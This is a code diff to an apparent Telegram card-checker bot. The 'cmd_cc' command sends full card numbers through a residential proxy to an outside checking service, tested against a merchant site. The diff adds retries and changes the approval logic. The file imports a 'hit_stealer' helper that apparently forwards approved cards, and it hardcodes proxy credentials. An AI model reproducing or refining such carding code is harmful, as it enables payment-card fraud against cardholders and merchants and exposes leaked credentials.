@@ -1,7 +1,7 @@
 from pyrogram import Client, filters
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
 from pyrogram.enums import ChatType
-import re, time, requests, httpx
+import re, time, requests, httpx, asyncio
 from plugins.func.users_sql import *
 from plugins.tools.hit_stealer import send_hit_if_approved
 from datetime import date
@@ -62,23 +62,28 @@ async def cmd_cc(Client, message):
 """)
 
         tic = time.perf_counter()
-        try:
-            proxy_input = "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
-            site_input = "https://www.tekkabazzar.com"
-            kiltes_url = f"https://kiltes.lol/str/?proxy={proxy_input}&site={site_input}&cc={fullcc}"
+        card_message = ""
+        for attempt in range(3):  # Retry 3 times
+            try:
+                proxy_input = "proxy.proxiware.com:1337:user-default-network-res-country-us:OedbOv0g3JOQ"
+                site_input = "https://www.tekkabazzar.com"
+                kiltes_url = f"https://kiltes.lol/str/?proxy={proxy_input}&site={site_input}&cc={fullcc}"
 
-            async with httpx.AsyncClient(timeout=25) as client:
-                res = await client.get(kiltes_url)
-                if res.status_code == 200:
-                    try:
-                        data = res.json()
-                        card_message = data.get("result") or data.get("message") or data.get("error") or res.text
-                    except:
-                        card_message = res.text
-                else:
-                    card_message = f"❌ HTTP {res.status_code}"
-        except Exception as e:
-            card_message = f"❌ Request failed: {e}"
+                async with httpx.AsyncClient(timeout=25) as client:
+                    res = await client.get(kiltes_url)
+                    if res.status_code == 200:
+                        try:
+                            data = res.json()
+                            card_message = data.get("result") or data.get("message") or data.get("error") or res.text
+                        except:
+                            card_message = res.text
+                        break  # success, break retry loop
+                    else:
+                        card_message = f"❌ HTTP {res.status_code} — Retrying..."
+            except Exception as e:
+                card_message = f"❌ Request failed: {e} — Retrying..."
+
+            await asyncio.sleep(2)  # wait before retry
 
         toc = time.perf_counter()
 
@@ -101,13 +106,9 @@ async def cmd_cc(Client, message):
             brand = type_ = level = bank = country = "N/A"
             flag = "🏳️"
 
+        # Decision Logic
         msg_lower = card_message.lower()
-        if "payment method added" in msg_lower or "charged" in msg_lower:
-            status = "Approved ✅"
-        elif any(k in msg_lower for k in ["declined", "not support", "do not honor", "pickup", "fraud", "stolen", "lost"]):
-            status = "Declined ❌"
-        else:
-            status = "Error"
+        status = "Approved ✅" if "payment method added" in msg_lower else "Declined ❌"
 
         final_msg = f"""
 <code>┏━━━━━━━⍟</code>
